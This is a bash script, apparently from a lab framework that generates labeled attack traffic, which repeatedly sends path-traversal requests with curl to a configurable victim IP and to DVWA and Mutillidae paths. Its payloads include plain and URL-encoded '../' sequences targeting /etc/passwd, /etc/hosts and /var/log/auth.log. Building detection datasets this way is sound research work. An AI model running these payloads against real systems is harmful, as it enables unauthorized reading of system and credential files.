#!/usr/bin/env bash
set -euo pipefail

RUN_NAME="$1"
NOTES_FILE="$2"

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/../config.sh"

TARGET_IP="${VICTIM_IP:-192.168.9.131}"

ATTACK_DURATION=300
PRE_IDLE=9
POST_IDLE=9

SEED="${SEED:-$RANDOM}"
RANDOM="$SEED"

rand_int() {
  local min="$1"
  local max="$2"
  echo $(( RANDOM % (max - min + 1) + min ))
}

pick_from_array() {
  local array_name="$1"
  local len idx
  eval "len=\${#${array_name}[@]}"
  idx=$(rand_int 0 $((len - 1)))
  eval "echo \${${array_name}[$idx]}"
}

log_kv() {
  echo "$1=$2" | tee -a "$NOTES_FILE"
}

log_time() {
  echo "$1 $(date -u +'%Y-%m-%d %H:%M:%S UTC')" | tee -a "$NOTES_FILE"
}

# ============================================================
# http_attack_path_traversal.sh
#
# 语义：
#   Web 路径遍历 / 敏感文件路径读取尝试。
#   不做 PHP-CGI RCE，不执行命令。
#
# PROFILE_ID:
#   traversal_light_probe
#   traversal_medium_probe
#   traversal_burst_probe
# ============================================================

ATTACK_SUBTYPE="path_traversal"
PROFILE_ID="${PROFILE_ID:-traversal_medium_probe}"

BASE_PATHS=(
  "/"
  "/index.php"
  "/mutillidae/index.php"
  "/dvwa/vulnerabilities/fi/"
)

TRAVERSAL_PAYLOADS=(
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "..%2f..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252f..%252f..%252fetc%252fpasswd"
  "../../../../etc/hosts"
  "../../../../proc/version"
  "../../../../var/log/auth.log"
)

PARAM_NAMES=(
  "file"
  "page"
  "path"
  "include"
  "template"
  "doc"
)

USER_AGENTS=(
  "Mozilla/5.0"
  "curl/7.88.1"
  "TraversalProbe/1.0"
)

configure_profile() {
  case "$PROFILE_ID" in
    traversal_light_probe)
      REQ_MIN=1
      REQ_MAX=2
      SLEEP_MIN=10
      SLEEP_MAX=18
      CURL_TIMEOUT=4
      ;;
    traversal_medium_probe)
      REQ_MIN=2
      REQ_MAX=4
      SLEEP_MIN=5
      SLEEP_MAX=10
      CURL_TIMEOUT=4
      ;;
    traversal_burst_probe)
      REQ_MIN=4
      REQ_MAX=8
      SLEEP_MIN=2
      SLEEP_MAX=5
      CURL_TIMEOUT=3
      ;;
    *)
      echo "[-] Unknown PROFILE_ID for path_traversal: $PROFILE_ID" >&2
      echo "    Allowed: traversal_light_probe, traversal_medium_probe, traversal_burst_probe" >&2
      exit 1
      ;;
  esac
}

traversal_once() {
  local base payload param ua url
  base="$(pick_from_array BASE_PATHS)"
  payload="$(pick_from_array TRAVERSAL_PAYLOADS)"
  param="$(pick_from_array PARAM_NAMES)"
  ua="$(pick_from_array USER_AGENTS)"

  if [[ "$base" == *"?"* ]]; then
    url="http://${TARGET_IP}${base}&${param}=${payload}"
  else
    url="http://${TARGET_IP}${base}?${param}=${payload}"
  fi

  curl -sS -k --max-time "$CURL_TIMEOUT" -A "$ua" "$url" >/dev/null 2>&1 || true
}

configure_profile

log_kv RUN_ID "$RUN_NAME"
log_kv ATTACK_CATEGORY "http_attack"
log_kv ATTACK_SUBTYPE "$ATTACK_SUBTYPE"
log_kv PROFILE_ID "$PROFILE_ID"
log_kv RANDOM_SEED "$SEED"
log_kv PROTOCOL "http"
log_kv TOOL "curl_path_traversal"
log_kv MODULE_SUMMARY "http_path_traversal_${PROFILE_ID}"

echo "[*] http_attack path_traversal started: $RUN_NAME profile=$PROFILE_ID seed=$SEED"

sleep "$PRE_IDLE"
log_time ATTACK_START

START_TIME=$SECONDS
while [[ $((SECONDS - START_TIME)) -lt "$ATTACK_DURATION" ]]; do
  req_count=$(rand_int "$REQ_MIN" "$REQ_MAX")
  for _ in $(seq 1 "$req_count"); do
    traversal_once
    if [[ $((SECONDS - START_TIME)) -ge "$ATTACK_DURATION" ]]; then
      break
    fi
  done
  sleep "$(rand_int "$SLEEP_MIN" "$SLEEP_MAX")"
done

log_time ATTACK_END
sleep "$POST_IDLE"

echo "[+] http_attack path_traversal finished: $RUN_NAME"
